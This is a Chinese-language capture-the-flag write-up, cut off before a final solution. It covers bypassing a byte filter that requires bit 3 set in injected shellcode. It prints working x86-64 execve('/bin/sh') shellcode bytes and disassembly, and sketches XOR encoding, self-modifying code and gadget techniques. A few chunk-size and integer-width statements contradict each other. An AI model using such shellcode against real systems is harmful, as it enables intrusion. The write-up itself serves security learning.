# Shellcode 2

上一版本的 Shellcoder 说：「Maybe next time we should add more architectures」…

我还以为 Shellcoder 2 会要求「三种不同架构」的共通语呢…

这次直接就是个 C 程序了。

大概是这样的：

```python
# 不是 Python，只是借用一下语法…
def main(argc: int, argv: list[str]) -> int:
    setbuf(_bss_start, 0);
    print("Welcome to 0ops shellcode trilogy.")
    print("This is shellcode II: Emission of light")
    print("Input your shellcode:")
    buf = mmap(addr='wherever', size=0x1000, prot=['read', 'write', 'exec'], flags=['anonymous', 'shared'], fd=0, offset=0)
    read('cin', buf, 0x1000)
    
    for ch in buf:
        if not ch & 8:
            print("I'm so foolish that I don't recognize this genius shellcode")
            exit(-1)
    
    # just execute it fine
    execute(buf)
```

也没有加很多限制，除了……输入的 Shellcode 中的每一个字节的（从低到高数）第 4 位必须是 1。

> 魔鬼…魔鬼…

先打开 Shell Storm 找一下有没有合用的吧…

先来一个最短的看一下：

```assembly
--[ asm
6a 42                   push   0x42
58                      pop    rax
fe c4                   inc    ah
48 99                   cqo
52                      push   rdx
48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
2f 73 68
57                      push   rdi
54                      push   rsp
5e                      pop    rsi
49 89 d0                mov    r8, rdx
49 89 d2                mov    r10, rdx
0f 05                   syscall
```

这可只有 29 个字节啊！

Python 跑一遍，这些字节不符合：

```
bad code 0x42
bad code 0xc4
bad code 0x52
bad code 0x62
bad code 0x73
bad code 0x57
bad code 0x54
bad code 0xd0
bad code 0xd2
bad code 0x5
```

其他都可能还可以绕过…但是你这个！`05`！居然！不能用！

`syscall`（`0f 05`）怎么绕得过去啊！

随手敲了一下，发现这个笨蛋程序不会过滤换行符。就算什么也不输入，他也会被这个 `\n` 绊死。

想要 Pwn？原程序很好地使用了 `read(STDIN, buf, 0x1000)` 的方式来规避 Buffer Overflow。

不过这也给了我们一个办法：只要发送超过 `4096` 个字符，那么超长的字符（包括 `\n`）就会被丢弃。

> 用这种勉强的办法来绕过 `code & 8` 限制…

另外，[这里](https://stackoverflow.com/questions/34110045/shellcode-with-restrictions) 有个非常类似的例子：32 位机器下面，0x80 被 Ban 了，不能在 Shellcode 的任何位置出现。

这里是她提供的一种替代手法：

```assembly
format ELF executable
use32
entry start

segment executable  writeable
  start:
  ;<some code>
  inc byte [ here + 1 ] ;<or some other math>
  jmp here
here:
  int 0x7f
segment readable  writeable
```

简而言之，就是利用到了 `buf` 不仅可执行，还是可写的特性。这允许程序在运行时动态修改自身。

> 我大概明白为什么这是病毒常见的行为模式了。

这种办法在 Banned 位不多的情况下还是可行的。假如仅仅是拒绝了 `0x80` 或者是 `0x0f`、`0x05`，都不至于像这般悲剧。

主要问题是，这样生成的代码必然会带有间接寻址。换句话说，会有大量的前缀 `0` 存在。因此这种方法是不太可行的。

[这里](https://h0mbre.github.io/LTER_SEH_Success/) 还有另一种 Forbidden Shellcode 的绕过方法，就比较接近我们的情况了。她禁止掉了所有的不可打印字符。

而我们这里是禁止掉了所有低第 4 位是 0 的字节。

> 幸好，`xor` 幸免于难。

按照这种一般化的绕过方法，我们首先需要置空一个寄存器。

如果用我们熟悉的 `rax`，就会生成一个 `\xc0` Byte，不合要求。

所以勉为其难地用一下 `rcx` 好了。这样得到的结果就是

```assembly
0:  48 31 c9	# xor    rcx,rcx
```

> [这个](https://defuse.ca/online-x86-assembler.htm#disassembly) 在线 Assembler & Disassembler 真是太好用

然後，我们得拿一串需要编码的 Shellcode。

> 越短越好。不想折腾太长的。

摸一个 21 Bytes 的：

```assembly
shellcode:     file format elf64-x86-64
Disassembly of section .text:
0000000000400080 <_start>:
  400080:       f7 e6                   mul    %esi
  400082:       50                      push   %rax
  400083:       48 bf 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rdi
  40008a:       2f 73 68 
  40008d:       57                      push   %rdi
  40008e:       48 89 e7                mov    %rsp,%rdi
  400091:       b0 3b                   mov    $0x3b,%al
  400093:       0f 05                   syscall 
;================================================================================
```

也就是：

```python
shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
```

然后把它分成 8 字节一组的 Chunk，并且把其中每个 Chunk 都倒置。为了避免不必要的麻烦，这里在右端补 `0x48`。

```python
['HHH\x05', '\x0f;°ç', '\x89HWh', 's//n', 'ib/¿', 'HPæ÷']
```

这样，从右到左读我们应该能刚好读出我们的目标 Shellcode 才对。

把每一个 4 Bytes 组都写成 32 位无符号整数的形式，我们可以得到该往 Stack 里放的东西：

```python
>>> magic_numbers
[20345673995759847, 9892252687639981934, 7593684420298598135]
```

或者，你可能会更喜欢：

```python
>>> [hex(v) for v in magic_numbers]
['0x4848485f3bb0e7', '0x89485768732f2f6e', '0x69622fbf4850e6f7']
```

现在的问题就是，如何在不犯规的情况下，把这些值放到映射内存中去。

首先，我们可以用 XOR 位操作，在某个寄存器中放入任意的值。

这里的限制，作用到寄存器里实际上就是「某些位必须是 1」。那么，简单用 XoR 做一下就好了。

那么，只要我们首先将 `%rsp` 设置为特殊的值，在需要的地方用 `push` 把数字写入内存（倒序地！）就可以实现任意内存的写入。

> 但是，这里又遇到一个问题：`push` 的指令代码不合法。没有办法用这种手段来把关键性的 `push` 代码纳入。

换种思路：我们把可以用的 Gadgets 都找出来，确认哪些合法。